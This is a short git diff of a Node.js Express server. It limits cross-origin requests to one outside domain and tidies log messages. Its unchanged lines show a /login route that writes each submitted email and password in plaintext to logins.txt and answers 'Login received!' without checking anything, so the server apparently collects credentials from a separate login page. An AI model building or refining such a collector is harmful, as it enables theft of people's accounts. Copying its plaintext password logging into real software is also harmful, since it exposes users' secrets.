@@ -5,7 +5,9 @@ const app = express();
 
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
-app.use(cors()); // Allow GitHub Pages requests
+app.use(cors({
+    origin: "https://0xraselrana.online" // only allow requests from your GitHub Pages domain
+}));
 
 app.post("/login", (req, res) => {
     const { email, password } = req.body;
@@ -17,11 +19,11 @@ app.post("/login", (req, res) => {
     const log = `Time: ${new Date().toISOString()}, Email: ${email}, Password: ${password}\n`;
 
     fs.appendFile("logins.txt", log, (err) => {
-        if (err) console.error("Error saving:", err);
+        if (err) console.error(err);
     });
 
     res.json({ status: "success", message: "Login received!" });
 });
 
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => console.log("Server running on " + PORT));
+app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
